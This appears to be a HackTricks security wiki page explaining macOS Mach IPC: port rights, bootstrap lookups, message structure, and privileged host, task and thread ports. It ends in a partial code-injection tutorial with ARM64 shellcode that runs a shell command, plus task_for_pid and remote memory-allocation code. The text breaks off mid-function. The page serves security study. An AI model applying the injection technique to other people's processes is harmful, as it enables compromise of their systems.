# macOS IPC - Inter Process Communication

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Mach messaging via Ports

### Basic Information

Mach uses **tasks** as the **smallest unit** for sharing resources, and each task can contain **multiple threads**. These **tasks and threads are mapped 1:1 to POSIX processes and threads**.

Communication between tasks occurs via Mach Inter-Process Communication (IPC), utilising one-way communication channels. **Messages are transferred between ports**, which act kind of **message queues** managed by the kernel.

A **port** is the **basic** element of Mach IPC. It can be used to **send messages and to receive** them.

Each process has an **IPC table**, in there it's possible to find the **mach ports of the process**. The name of a mach port is actually a number (a pointer to the kernel object).

A process can also send a port name with some rights **to a different task** and the kernel will make this entry in the **IPC table of the other task** appear.

### Port Rights

Port rights, which define what operations a task can perform, are key to this communication. The possible **port rights** are ([definitions from here](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **Receive right**, which allows receiving messages sent to the port. Mach ports are MPSC (multiple-producer, single-consumer) queues, which means that there may only ever be **one receive right for each port** in the whole system (unlike with pipes, where multiple processes can all hold file descriptors to the read end of one pipe).
  * A **task with the Receive** right can receive messages and **create Send rights**, allowing it to send messages. Originally only the **own task has Receive right over its por**t.
  * If the owner of the Receive right **dies** or kills it, the **send right became useless (dead name).**
* **Send right**, which allows sending messages to the port.
  * The Send right can be **cloned** so a task owning a Send right can clone the right and **grant it to a third task**.
  * Note that **port rights** can also be **passed** though Mac messages.
* **Send-once right**, which allows sending one message to the port and then disappears.
  * This right **cannot** be **cloned**, but it can be **moved**.
* **Port set right**, which denotes a _port set_ rather than a single port. Dequeuing a message from a port set dequeues a message from one of the ports it contains. Port sets can be used to listen on several ports simultaneously, a lot like `select`/`poll`/`epoll`/`kqueue` in Unix.
* **Dead name**, which is not an actual port right, but merely a placeholder. When a port is destroyed, all existing port rights to the port turn into dead names.

**Tasks can transfer SEND rights to others**, enabling them to send messages back. **SEND rights can also be cloned, so a task can duplicate and give the right to a third task**. This, combined with an intermediary process known as the **bootstrap server**, allows for effective communication between tasks.

### File Ports

File ports allows to encapsulate file descriptors in Mac ports (using Mach port rights). It's possible to create a `fileport` from a given FD using `fileport_makeport` and create a FD froma. fileport using `fileport_makefd`.

### Establishing a communication

As mentioned previously, it's possible to send rights using Mach messages, however, you **cannot send a right without already having a right** to send a Mach message. So, how is the first communication stablished?

For this, he **bootstrap server** (**launchd** in mac) is involved, as **everyone can get a SEND right to the bootstrap server**, it's possible to ask it for a right to send a message to another process:

1. Task **A** creates a **new port**, getting the **RECEIVE right** over it.
2. Task **A**, being the holder of the RECEIVE right, **generates a SEND right for the port**.
3. Task **A** establishes a **connection** with the **bootstrap server**, and **sends it the SEND right** for the port it generated at the beginning.
   * Remember that anyone can get a SEND right to the bootstrap server.
4. Task A sends a `bootstrap_register` message to the bootstrap server to **associate the given port with a name** like `com.apple.taska`
5. Task **B** interacts with the **bootstrap server** to execute a bootstrap **lookup for the service** name (`bootstrap_lookup`). So the bootstrap server can respond, task B will send it a **SEND right to a port it previously created** inside the lookup message. If the lookup is successful, the **server duplicates the SEND right** received from Task A and **transmits it to Task B**.
   * Remember that anyone can get a SEND right to the bootstrap server.
6. With this SEND right, **Task B** is capable of **sending** a **message** **to Task A**.
7. For a bi-directional communication usually task **B** generates a new port with a **RECEIVE** right and a **SEND** right, and gives the **SEND right to Task A** so it can send messages to TASK B (bi-directional communication).

The bootstrap server **cannot authenticate** the service name claimed by a task. This means a **task** could potentially **impersonate any system task**, such as falsely **claiming an authorization service name** and then approving every request.

Then, Apple stores the **names of system-provided services** in secure configuration files, located in **SIP-protected** directories: `/System/Library/LaunchDaemons` and `/System/Library/LaunchAgents`. Alongside each service name, the **associated binary is also stored**. The bootstrap server, will create and hold a **RECEIVE right for each of these service names**.

For these predefined services, the **lookup process differs slightly**. When a service name is being looked up, launchd starts the service dynamically. The new workflow is as follows:

* Task **B** initiates a bootstrap **lookup** for a service name.
* **launchd** checks if the task is running and if it isn’t, **starts** it.
* Task **A** (the service) performs a **bootstrap check-in** (`bootstrap_check_in()`). Here, the **bootstrap** server creates a SEND right, retains it, and **transfers the RECEIVE right to Task A**.
* launchd duplicates the **SEND right and sends it to Task B**.
* Task **B** generates a new port with a **RECEIVE** right and a **SEND** right, and gives the **SEND right to Task A** (the svc) so it can send messages to TASK B (bi-directional communication).

However, this process only applies to predefined system tasks. Non-system tasks still operate as described originally, which could potentially allow for impersonation.

{% hint style="danger" %}
Therefore, launchd should never crash or the whole sysem will crash.
{% endhint %}

### A Mach Message

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

The `mach_msg` function, essentially a system call, is utilized for sending and receiving Mach messages. The function requires the message to be sent as the initial argument. This message must commence with a `mach_msg_header_t` structure, succeeded by the actual message content. The structure is defined as follows:

```c
typedef struct {
	mach_msg_bits_t               msgh_bits;
	mach_msg_size_t               msgh_size;
	mach_port_t                   msgh_remote_port;
	mach_port_t                   msgh_local_port;
	mach_port_name_t              msgh_voucher_port;
	mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```

Processes possessing a _**receive right**_ can receive messages on a Mach port. Conversely, the **senders** are granted a _**send**_ or a _**send-once right**_. The send-once right is exclusively for sending a single message, after which it becomes invalid.

The initial field **`msgh_bits`** is a bitmap:

* First bit (most significative) is used to indicate that a message is complex (more on this below)
* The 3rd and 4th are used by the kernel
* The **5 least significant bits of the 2nd byte** from can be used for **voucher**: another type of port to send key/value combinations.
* The **5 least significant bits of the 3rd byte** from can be used for **local port**
* The **5 least significant bits of the 4th byte** from can be used for **remote port**

The types that can be specified in the voucher, local and remote ports are (from [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):

```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```

For example, `MACH_MSG_TYPE_MAKE_SEND_ONCE` can be used to **indicate** that a **send-once** **right** should be derived and transferred for this port. It can also be specified `MACH_PORT_NULL` to prevent the recipient to be able to reply.

In order to achieve an easy **bi-directional communication** a process can specify a **mach port** in the mach **message header** called the _reply port_ (**`msgh_local_port`**) where the **receiver** of the message can **send a reply** to this message.

{% hint style="success" %}
Note that this kind of bi-directional communication is used in XPC messages that expect a replay (`xpc_connection_send_message_with_reply` and `xpc_connection_send_message_with_reply_sync`). But **usually different ports are created** as explained previously to create the bi-directional communication.
{% endhint %}

The other fields of the message header are:

* `msgh_size`: the size of the entire packet.
* `msgh_remote_port`: the port on which this message is sent.
* `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach\_vouchers.html).
* `msgh_id`: the ID of this message, which is interpreted by the receiver.

{% hint style="danger" %}
Note that **mach messages are sent over a `mach port`**, which is a **single receiver**, **multiple sender** communication channel built into the mach kernel. **Multiple processes** can **send messages** to a mach port, but at any point only **a single process can read** from it.
{% endhint %}

Messages are then formed by the **`mach_msg_header_t`** header followed by the **body** and by the **trailer** (if any) and it can grant permission to reply to it. In these cases, the kernel just need to pass the message from one task to the other.

A **trailer** is **information added to the message by the kernel** (cannot be set by the user) which can be requested in message reception with the flags `MACH_RCV_TRAILER_<trailer_opt>` (there is different information that can be requested).

#### Complex Messages

However, there are other more **complex** messages, like the ones passing additional port rights or sharing memory, where the kernel also needs to send these objects to the recipient. In this cases the most significant bit of the header `msgh_bits` is set.

The possible descriptors to pass are defined in [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):

```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
	natural_t                     pad1;
	mach_msg_size_t               pad2;
	unsigned int                  pad3 : 24;
	mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```

In 32bits, all the descriptors are 12B and the descriptor type is in the 11th one. In 64 bits, the sizes vary.

{% hint style="danger" %}
The kernel will copy the descriptors from one task to the other but first **creating a copy in kernel memory**. This technique, known as "Feng Shui" has been abused in several exploits to make the **kernel copy data in its memory** making a process send descriptors to itself. Then the process can receive the messages (the kernel will free them).

It's also possible to **send port rights to a vulnerable process**, and the port rights will just appear in the process (even if he isn't handling them).
{% endhint %}

### Mac Ports APIs

Note that ports are associated to the task namespace, so to create or search for a port, the task namespace is also queried (more in `mach/mach_port.h`):

* **`mach_port_allocate` | `mach_port_construct`**: **Create** a port.
  * `mach_port_allocate` can also create a **port set**: receive right over a group of ports. Whenever a message is received it's indicated the port from where it was.
* `mach_port_allocate_name`: Change the name of the port (by default 32bit integer)
* `mach_port_names`: Get port names from a target
* `mach_port_type`: Get rights of a task over a name
* `mach_port_rename`: Rename a port (like dup2 for FDs)
* `mach_port_allocate`: Allocate a new RECEIVE, PORT\_SET or DEAD\_NAME
* `mach_port_insert_right`: Create a new right in a port where you have RECEIVE
* `mach_port_...`
* **`mach_msg`** | **`mach_msg_overwrite`**: Functions used to **send and receive mach messages**. The overwrite version allows to specify a different buffer for message reception (the other version will just reuse it).

### Debug mach\_msg

As the functions **`mach_msg`** and **`mach_msg_overwrite`** are the ones used to send a receive messages, setting a breakpoint on them would allow to inspect the sent a received messages.

For example start debugging any application you can debug as it will load **`libSystem.B` which will use this function**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
    frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 &#x3C;+0>:  pacibsp
    0x181d3ac24 &#x3C;+4>:  sub    sp, sp, #0x20
    0x181d3ac28 &#x3C;+8>:  stp    x29, x30, [sp, #0x10]
    0x181d3ac2c &#x3C;+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
  * frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
    frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
    frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
    frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
    frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
    frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
    frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
    frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
    frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
    frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
</code></pre>

To get the arguments of **`mach_msg`** check the registers. These are the arguments (from [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):

```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
	mach_msg_header_t *msg,
	mach_msg_option_t option,
	mach_msg_size_t send_size,
	mach_msg_size_t rcv_size,
	mach_port_name_t rcv_name,
	mach_msg_timeout_t timeout,
	mach_port_name_t notify);
```

Get the values from the registries:

```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
      x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
      x1 = 0x0000000003114207 ;mach_msg_option_t (option)
      x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
      x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
      x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
      x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
      x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```

Inspect the message header checking the first argument:

```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```

That type of `mach_msg_bits_t` is very common to allow a reply.



### Enumerate ports

```bash
lsmp -p <pid>

sudo lsmp -p 1 
Process (1) : launchd
  name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
                  +     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
                  +     send        --------        ---            1         <-                                       0x00002603  (74295) passd
                  [...]
```

The **name** is the default name given to the port (check how it's **increasing** in the first 3 bytes). The **`ipc-object`** is the **obfuscated** unique **identifier** of the port.\
Note also how the ports with only **`send`** right are **identifying the owner** of it (port name + pid).\
Also note the use of **`+`** to indicate **other tasks connected to the same port**.

It's also possible to use [**procesxp**](https://www.newosxbook.com/tools/procexp.html) to see also the **registered service names** (with SIP disabled due to the need of `com.apple.system-task-port`):

```
procesp 1 ports
```

You can install this tool in iOS downloading it from [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Code example

Note how the **sender** **allocates** a port, create a **send right** for the name `org.darlinghq.example` and send it to the **bootstrap server** while the sender asked for the **send right** of that name and used it to **send a message**.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

    // Create a new port.
    mach_port_t port;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (kr != KERN_SUCCESS) {
        printf("mach_port_allocate() failed with code 0x%x\n", kr);
        return 1;
    }
    printf("mach_port_allocate() created port right name %d\n", port);


    // Give us a send right to this port, in addition to the receive right.
    kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) {
        printf("mach_port_insert_right() failed with code 0x%x\n", kr);
        return 1;
    }
    printf("mach_port_insert_right() inserted a send right\n");


    // Send the send right to the bootstrap server, so that it can be looked up by other processes.
    kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
    if (kr != KERN_SUCCESS) {
        printf("bootstrap_register() failed with code 0x%x\n", kr);
        return 1;
    }
    printf("bootstrap_register()'ed our port\n");


    // Wait for a message.
    struct {
        mach_msg_header_t header;
        char some_text[10];
        int some_number;
        mach_msg_trailer_t trailer;
    } message;

    kr = mach_msg(
        &message.header,  // Same as (mach_msg_header_t *) &message.
        MACH_RCV_MSG,     // Options. We're receiving a message.
        0,                // Size of the message being sent, if sending.
        sizeof(message),  // Size of the buffer for receiving.
        port,             // The port to receive a message on.
        MACH_MSG_TIMEOUT_NONE,
        MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
    );
    if (kr != KERN_SUCCESS) {
        printf("mach_msg() failed with code 0x%x\n", kr);
        return 1;
    }
    printf("Got a message\n");

    message.some_text[9] = 0;
    printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

    // Lookup the receiver port using the bootstrap server.
    mach_port_t port;
    kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
    if (kr != KERN_SUCCESS) {
        printf("bootstrap_look_up() failed with code 0x%x\n", kr);
        return 1;
    }
    printf("bootstrap_look_up() returned port right name %d\n", port);


    // Construct our message.
    struct {
        mach_msg_header_t header;
        char some_text[10];
        int some_number;
    } message;

    message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    message.header.msgh_remote_port = port;
    message.header.msgh_local_port = MACH_PORT_NULL;

    strncpy(message.some_text, "Hello", sizeof(message.some_text));
    message.some_number = 35;

    // Send the message.
    kr = mach_msg(
        &message.header,  // Same as (mach_msg_header_t *) &message.
        MACH_SEND_MSG,    // Options. We're sending a message.
        sizeof(message),  // Size of the message being sent.
        0,                // Size of the buffer for receiving.
        MACH_PORT_NULL,   // A port to receive a message on, if receiving.
        MACH_MSG_TIMEOUT_NONE,
        MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
    );
    if (kr != KERN_SUCCESS) {
        printf("mach_msg() failed with code 0x%x\n", kr);
        return 1;
    }
    printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

## Privileged Ports

There are some special ports that allows to **perform certain sensitive actions or access certain sensitive data** in case a tasks have the **SEND** permissions over them. This makes these ports very interesting from an attackers perspective not only because of the capabilities but because it's possible to **share SEND permissions across tasks**.

### Host Special Ports

These ports are represented by a number.

**SEND** rights can be obtained by calling **`host_get_special_port`** and **RECEIVE** rights calling **`host_set_special_port`**. However, both calls require the **`host_priv`** port which only root can access. Moreover, in the past root was able to call **`host_set_special_port`** and hijack arbitrary that allowed for example to bypass code signatures by hijacking `HOST_KEXTD_PORT` (SIP now prevents this).

These are divided in 2 groups: The **first 7 ports are owned by the kernel** being the 1 `HOST_PORT`, the 2 `HOST_PRIV_PORT` , the 3 `HOST_IO_MASTER_PORT` and the 7 is `HOST_MAX_SPECIAL_KERNEL_PORT`.\
The ones starting **from** the number **8** are **owned by system daemons** and they can be found declared in [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host\_special\_ports.h.auto.html).

* **Host port**: If a process has **SEND** privilege over this port he can get **information** about the **system** calling its routines like:
  * `host_processor_info`: Get processor info
  * `host_info`: Get host info
  * `host_virtual_physical_table_info`: Virtual/Physical page table (requires MACH\_VMDEBUG)
  * `host_statistics`: Get host statistics
  * `mach_memory_info`: Get kernel memory layout
* **Host Priv port**: A process with **SEND** right over this port can perform **privileged actions** like showing boot data or trying to load a kernel extension. The **process need to be root** to get this permission.
  * Moreover, in order to call **`kext_request`** API it's needed to have other entitlements **`com.apple.private.kext*`** which are only given to Apple binaries.
  * Other routines that can be called are:
    * `host_get_boot_info`: Get `machine_boot_info()`
    * `host_priv_statistics`: Get privileged statistics
    * `vm_allocate_cpm`: Allocate Contiguous Physical Memory
    * `host_processors`: Send right to host processors
    * `mach_vm_wire`: Make memory resident
  * As **root** can access this permission, it could call `host_set_[special/exception]_port[s]` to **hijack host special or exception ports**.

It's possible to **see all the host special ports** by running:

```bash
procexp all ports | grep "HSP"
```

### Task Special Ports

These are ports reserved for well known services. It's possible to get/set them calling `task_[get/set]_special_port`. They can be found in `task_special_ports.h`:

```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
					   world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```

From [here](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html):

* **TASK\_KERNEL\_PORT**\[task-self send right]: The port used to control this task. Used to send messages that affect the task. This is the port returned by **mach\_task\_self (see Task Ports below)**.
* **TASK\_BOOTSTRAP\_PORT**\[bootstrap send right]: The task's bootstrap port. Used to send messages requesting return of other system service ports.
* **TASK\_HOST\_NAME\_PORT**\[host-self send right]: The port used to request information of the containing host. This is the port returned by **mach\_host\_self**.
* **TASK\_WIRED\_LEDGER\_PORT**\[ledger send right]: The port naming the source from which this task draws its wired kernel memory.
* **TASK\_PAGED\_LEDGER\_PORT**\[ledger send right]: The port naming the source from which this task draws its default memory managed memory.

### Task Ports

Originally Mach didn't have "processes" it had "tasks" which was considered more like a container of threads. When Mach was merged with BSD **each task was correlated with a BSD process**. Therefore every BSD process has the details it needs to be a process and every Mach task also have its inner workings (except for the inexistent pid 0 which is the `kernel_task`).

There are two very interesting functions related to this:

* `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Get a SEND right for the task por of the task related to the specified by the `pid` and give it to the indicated `target_task_port` (which is usually the caller task which has used `mach_task_self()`, but could be a SEND port over a different task.)
* `pid_for_task(task, &pid)`: Given a SEND right to a task, find to which PID this task is related to.

In order to perform actions within the task, the task needed a `SEND` right to itself calling `mach_task_self()` (which uses the `task_self_trap` (28)). With this permission a task can perform several actions like:

* `task_threads`: Get SEND right over all task ports of the threads of the task
* `task_info`: Get info about a task
* `task_suspend/resume`: Suspend or resume a task
* `task_[get/set]_special_port`
* `thread_create`: Create a thread
* `task_[get/set]_state`: Control task state
* and more can be found in [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

{% hint style="danger" %}
Notice that with a SEND right over a task port of a **different task**, it's possible to perform such actions over a different task.
{% endhint %}

Moreover,  the task\_port is also the **`vm_map`** port which allows to **read an manipulate memory** inside a task with functions such as `vm_read()` and `vm_write()`. This basically means that a task with SEND rights over the task\_port of a different task is going to be able to **inject code into that task**.

Remember that because the **kernel is also a task**, if someone manages to get a **SEND permissions** over the **`kernel_task`**, it'll be able to make the kernel execute anything (jailbreaks).

* Call `mach_task_self()` to **get the name** for this port for the caller task. This port is only **inherited** across **`exec()`**; a new task created with `fork()` gets a new task port (as a special case, a task also gets a new task port after `exec()`in a suid binary). The only way to spawn a task and get its port is to perform the ["port swap dance"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) while doing a `fork()`.
* These are the restrictions to access the port (from `macos_task_policy` from the binary `AppleMobileFileIntegrity`):
  * If the app has **`com.apple.security.get-task-allow` entitlement** processes from the **same user can access the task port** (commonly added by Xcode for debugging). The **notarization** process won't allow it to production releases.
  * Apps with the **`com.apple.system-task-ports`** entitlement can get the **task port for any** process, except the kernel. In older versions it was called **`task_for_pid-allow`**. This is only granted to Apple applications.
  * **Root can access task ports** of applications **not** compiled with a **hardened** runtime (and not from Apple).

**The task name port:** An unprivileged version of the _task port_. It references the task, but does not allow controlling it. The only thing that seems to be available through it is `task_info()`.

### Thread Ports

Threads also have associated ports, which are visible from the task calling **`task_threads`** and from the processor with `processor_set_threads`. A SEND right to the thread port allows to use the function from the `thread_act` subsystem, like:

* `thread_terminate`
* `thread_[get/set]_state`
* `act_[get/set]_state`
* `thread_[suspend/resume]`
* `thread_info`
* ...

Any thread can get this port calling to **`mach_thread_sef`**.

### Shellcode Injection in thread via Task port

You can grab a shellcode from:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
    double result = 0;
    for (int i = 0; i < 10000; i++) {
        result += sqrt(i) * tan(i) - cos(i);
    }
    return result;
}

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
        while (true) {
            [NSThread sleepForTimeInterval:5];

            performMathOperations();  // Silent action

            [NSThread sleepForTimeInterval:5];
        }
    }
    return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.get-task-allow</key>
    <true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**Compile** the previous program and add the **entitlements** to be able to inject code with the same user (if not you will need to use **sudo**).

<details>

<summary>sc_injector.m</summary>

```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
        vm_map_t target,
        mach_vm_address_t *address,
        mach_vm_size_t size,
        int flags
);

kern_return_t mach_vm_write
(
        vm_map_t target_task,
        mach_vm_address_t address,
        vm_offset_t data,
        mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

    task_t remoteTask;

    // Get access to the task port of the process we want to inject into
    kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
    if (kr != KERN_SUCCESS) {
        fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
        return (-1);
    }
    else{
        printf("Gathered privileges over the task port of process: %d\n", pid);
    }

    // Allocate memory for the stack
    mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
    mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
    kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
    
    if (kr != KERN_SUCCESS)
    {
